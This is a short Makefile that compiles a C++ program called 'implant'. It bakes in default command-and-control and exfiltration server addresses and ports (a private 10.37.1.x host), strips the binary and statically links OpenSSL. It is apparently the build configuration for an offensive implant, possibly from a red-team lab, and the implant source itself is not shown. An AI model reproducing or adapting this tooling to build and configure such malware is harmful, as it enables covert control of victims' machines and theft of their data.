# Set the c2 server ip and port
C2_IP ?= "10.37.1.249"
C2_PORT ?= 8888

# Set the exfil server ip and port
EXFIL_IP ?= "10.37.1.249"
EXFIL_PORT ?= 8889

# Compiler and flags for c++
CXX = g++
CXXFLAGS = -O2 -s -DC2_IP='$(C2_IP)' -DC2_PORT='$(C2_PORT)' -DEXFIL_IP='$(EXFIL_IP)' -DEXFIL_PORT='$(EXFIL_PORT)' 
LDFLAGS = -Wl,-Bstatic -lssl -lcrypto -Wl,-Bdynamic -ldl -lpthread
TARGET = implant
SRC = implant.cpp 

all: $(TARGET)

$(TARGET): $(SRC)
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC) $(LDFLAGS)
clean:
	rm -f $(TARGET)
